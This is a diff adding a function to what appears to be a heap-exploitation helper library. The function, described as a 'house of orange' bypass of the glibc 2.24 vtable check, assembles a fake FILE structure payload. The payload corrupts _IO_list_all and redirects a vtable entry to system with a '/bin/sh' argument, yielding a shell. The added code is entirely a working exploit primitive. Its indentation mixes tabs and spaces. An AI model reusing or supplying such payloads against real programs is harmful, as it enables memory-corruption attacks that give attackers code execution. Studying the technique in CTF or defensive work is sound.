@@ -128,6 +128,15 @@ def house_of_orange(head_addr, system_addr, io_list_all):
     return payload
 
 
+def VtableCheckBypass(vtable_addr, system_addr, binsh_addr, io_list_all_addr):
+    """
+    houseoforange glibc.2.24 bypass vtablecheck
+    """
+	payload = p64(0) + p64(0x61) + p64(0) + p64(io_list_all_addr - 0x10)
+	payload += p64(0) + p64((binsh_addr - 100) / 2 + 1) + p64(0) + p64(0) + p64((binsh_addr - 100) / 2) + p64(0) * 6 + p64(0) + p64(0) * 4
+	payload += p64(0) + p64(2) + p64(3) + p64(0) + p64(0xffffffffffffffff) + p64(0) * 2 + p64(vtable_addr - 0x18) + p64(system_addr)
+	return payload
+
 def get_main_arena(libc_file):
     """
     if libc arch is amd64-64
